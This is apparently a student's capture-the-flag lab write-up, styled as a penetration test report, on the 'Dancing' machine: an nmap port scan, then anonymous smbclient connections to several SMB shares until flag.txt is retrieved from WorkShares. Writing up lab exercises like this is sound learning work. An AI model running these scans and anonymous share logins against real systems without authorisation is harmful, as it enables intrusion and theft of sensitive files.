---
Title: SWS101 Flipped_class
categories: [SWS101,Dancing Report]
tags: SWS 101
---
![Dancing](/assets/img/dancing.jpeg)

# Penetration Test Report
Target: 10.129.59.7


## Information Gathering Phase
Port Scanning with Nmap:
````
nmap -sV -p- 10.129.59.7
````
![dancingnmap](/assets/img/nmapdancing.png)

*  Open ports discovered.

## Enumeration Phase
````
smbclient -L 10.129.59.7
````
![dancing-l](/assets/img/dancingl.png)

* SMB Shares: Found an SMB share.
* Lets try tot connect to each share.
````
smbclient //10.129.59.7/ADMIN$ -N
````
![dancingadmin](/assets/img/dancinglog.png)
Unable to connect.

````
smbclient //10.129.59.7/IPCS$ -N
````
![dancingadmin](/assets/img/dancingf.png)
* I was able to login but there isn't anything.

````
smbclient //10.129.59.7/WorkShares$ -N
````
![dancingworkspaces](/assets/img/dancinglogin.png)

Finally I was able to loggin to WorkShares and could retrive "flag.txt".
## Exploitation Phase
![dancingworkspaces](/assets/img/dancingflag.png)

## Conclusion
Penetration test for dancing was intresting and it demonstrate our ability to get access to sensitive files like "file.txt". The primary goal of this penetration test is to get the "flag.txt" from the system.


